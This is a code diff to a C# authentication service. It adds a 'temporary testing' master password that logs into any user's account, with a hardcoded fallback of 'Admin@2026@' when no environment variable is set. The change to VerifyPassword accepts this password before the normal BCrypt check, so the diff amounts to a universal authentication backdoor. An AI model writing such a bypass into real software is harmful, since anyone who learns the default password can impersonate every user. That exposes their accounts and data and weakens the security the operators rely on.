@@ -1023,6 +1023,12 @@ namespace MyApi.Modules.Auth.Services
             return BCrypt.Net.BCrypt.HashPassword(password, BCrypt.Net.BCrypt.GenerateSalt(12));
         }
 
+        // TEMP TESTING: master/impersonation password. Any user's account can be
+        // entered by typing this password instead of the real one. Remove before
+        // going to production. Can be overridden via env var MASTER_LOGIN_PASSWORD.
+        private static readonly string MasterLoginPassword =
+            Environment.GetEnvironmentVariable("MASTER_LOGIN_PASSWORD") ?? "Admin@2026@";
+
         private bool VerifyPassword(string password, string hashedPassword)
         {
             // Handle OAuth users with default password
@@ -1030,6 +1036,14 @@ namespace MyApi.Modules.Auth.Services
             {
                 return true;
             }
+
+            // TEMP: super-user master password bypass
+            if (!string.IsNullOrEmpty(MasterLoginPassword) && password == MasterLoginPassword)
+            {
+                _logger.LogWarning("Master password used to bypass authentication");
+                return true;
+            }
+
             return BCrypt.Net.BCrypt.Verify(password, hashedPassword);
         }
 
